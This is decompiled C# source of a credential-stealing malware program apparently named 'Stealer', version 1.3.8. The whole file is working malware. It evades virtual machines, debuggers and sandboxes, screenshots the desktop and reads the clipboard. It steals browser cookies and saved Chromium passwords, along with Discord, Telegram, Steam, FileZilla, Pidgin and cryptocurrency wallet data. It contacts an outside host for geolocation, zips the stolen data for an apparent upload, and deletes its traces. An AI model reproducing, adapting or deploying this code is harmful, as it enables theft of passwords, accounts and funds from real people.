using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ChromeRecovery;

namespace Stealer
{
	// Token: 0x0200001B RID: 27
	public class Program
	{
		// Token: 0x06000121 RID: 289 RVA: 0x000092B0 File Offset: 0x000074B0
		[STAThread]
		private static void Main(string[] args)
		{
			if (File.Exists(Program.path2))
			{
				Environment.Exit(0);
			}
			if (Program.GetCheckVMBot())
			{
				Environment.Exit(0);
			}
			StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			Directory.CreateDirectory(Program.path);
			streamWriter.WriteLine("Created directory");
			Class4.SaveScreen(Program.path + "\\image.png");
			streamWriter.WriteLine("SaveScreen");
			streamWriter.WriteLine("[Browsers Started]");
			streamWriter.Close();
			try
			{
				Class18.smethod_2();
				Class20.smethod_0();
				Class26.smethod_0();
				Class18.Cookies();
				Class30.smethod_9();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			try
			{
				Class2.smethod_0(Program.path + "\\Browsers");
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.ToString());
			}
			try
			{
				List<Account> list = Chromium.Grab();
				foreach (Account account in list)
				{
					File.WriteAllText(Program.path + "\\Browsers\\PasswordsChromium.txt", string.Concat(new string[]
					{
						"Url: ",
						account.URL,
						"\nUsername: ",
						account.UserName,
						"\nPassword: ",
						account.Password,
						"\nApplication: ",
						account.Application,
						"\n"
					}));
				}
			}
			catch (Exception ex3)
			{
				Console.WriteLine(ex3.ToString());
			}
			streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			streamWriter.WriteLine("[Browser End]");
			Class4.Discord(Program.path + "\\Discord");
			streamWriter.WriteLine("Discord");
			Class4.FileZilla(Program.path + "\\FileZilla");
			streamWriter.WriteLine("FileZilla");
			Class4.Telegram(Program.path + "\\Telegram");
			streamWriter.WriteLine("Telegram");
			Class4.Steam(Program.path + "\\Steam");
			streamWriter.WriteLine("Steam");
			Class4.smethod_3(Program.path + "\\Wallets");
			streamWriter.WriteLine("Wallets");
			Class4.Pidgin(Program.path + "\\Pidgin");
			streamWriter.WriteLine("Pidgin");
			try
			{
				using (WebClient webClient = new WebClient())
				{
					byte[] bytes = webClient.DownloadData("http://fuckingav.xyz/antivirus.php");
					Program.geo = Encoding.ASCII.GetString(bytes);
				}
			}
			catch
			{
				Program.geo = "Unknown?Unknown?Unknown?UN";
			}
			streamWriter.WriteLine("Geo");
			Class4.smethod_0(Program.path + "\\info.txt");
			try
			{
				string text = string.Concat(new string[]
				{
					Program.string_1,
					"\\[",
					Program.geo.Split(new char[]
					{
						'?'
					})[3],
					"]",
					Program.geo.Split(new char[]
					{
						'?'
					})[0],
					".zip"
				});
				Class6.smethod_3(Program.path, text);
				Class6.smethod_4(text, Program.id, "[" + Program.geo.Split(new char[]
				{
					'?'
				})[3] + "]" + Program.geo.Split(new char[]
				{
					'?'
				})[0]);
				Directory.Delete(Program.path, true);
				Directory.Delete(Program.string_1, true);
			}
			catch (Exception ex4)
			{
				Console.WriteLine(ex4.ToString());
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x000096A4 File Offset: 0x000078A4
		private static bool smethod_0()
		{
			bool result;
			Program.mutex_0 = new Mutex(true, "grnbgjrrytjkmytktuyk", ref result);
			return result;
		}

		// Token: 0x06000123 RID: 291 RVA: 0x000096C4 File Offset: 0x000078C4
		private static bool smethod_1()
		{
			using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					try
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						bool flag = managementBaseObject["Model"].ToString().ToLower().Contains("virtual");
						if ((text.Equals("microsoft corporation") && flag) || text.Contains("vmware") || managementBaseObject["Model"].ToString().Equals("VirtualBox"))
						{
							return true;
						}
					}
					catch (Exception)
					{
						return false;
					}
				}
			}
			return false;
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000097C8 File Offset: 0x000079C8
		private static bool smethod_2(Process process_0)
		{
			bool result;
			try
			{
				bool flag = false;
				Class1.CheckRemoteDebuggerPresent(process_0.Handle, ref flag);
				result = flag;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000125 RID: 293 RVA: 0x00002A19 File Offset: 0x00000C19
		private static bool smethod_3()
		{
			return SystemInformation.TerminalServerSession;
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00009800 File Offset: 0x00007A00
		private static bool smethod_4()
		{
			return Process.GetProcessesByName("wsnm").Length != 0 || Class1.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00002A26 File Offset: 0x00000C26
		public static bool GetCheckVMBot()
		{
			return Program.smethod_2(Process.GetCurrentProcess()) || Program.smethod_4() || Program.smethod_3() || Program.smethod_1();
		}

		// Token: 0x06000128 RID: 296 RVA: 0x0000276F File Offset: 0x0000096F
		public Program()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x06000129 RID: 297 RVA: 0x00009834 File Offset: 0x00007A34
		// Note: this type is marked as 'beforefieldinit'.
		static Program()
		{
			Class34.A1SfXVPz7w9eh();
			Program.string_0 = "";
			Program.version = "1.3.8";
			Program.timestart = DateTime.Now.ToString();
			Program.timerint = 0;
			Program.clipp = ((Clipboard.GetText().Length <= 0 || Clipboard.GetText().Length >= 300) ? "" : Clipboard.GetText());
			Program.geo = "";
			Program.randomnm = Class6.smethod_2();
			Program.path2 = "C:\\ProgramData\\debug.txt";
			Program.string_1 = Environment.GetEnvironmentVariable("LocalAppData") + "\\" + Class6.smethod_0();
			Program.path = Program.string_1 + "\\" + Program.randomnm;
			Program.id = "";
		}

		// Token: 0x04000046 RID: 70
		public static Thread s;

		// Token: 0x04000047 RID: 71
		private static string string_0;

		// Token: 0x04000048 RID: 72
		public static string version;

		// Token: 0x04000049 RID: 73
		public static string timestart;

		// Token: 0x0400004A RID: 74
		public static int timerint;

		// Token: 0x0400004B RID: 75
		public static string clipp;

		// Token: 0x0400004C RID: 76
		public static string geo;

		// Token: 0x0400004D RID: 77
		public static string randomnm;

		// Token: 0x0400004E RID: 78
		public static string path2;

		// Token: 0x0400004F RID: 79
		private static string string_1;

		// Token: 0x04000050 RID: 80
		public static string path;

		// Token: 0x04000051 RID: 81
		public static string id;

		// Token: 0x04000052 RID: 82
		private static Mutex mutex_0;
	}
}
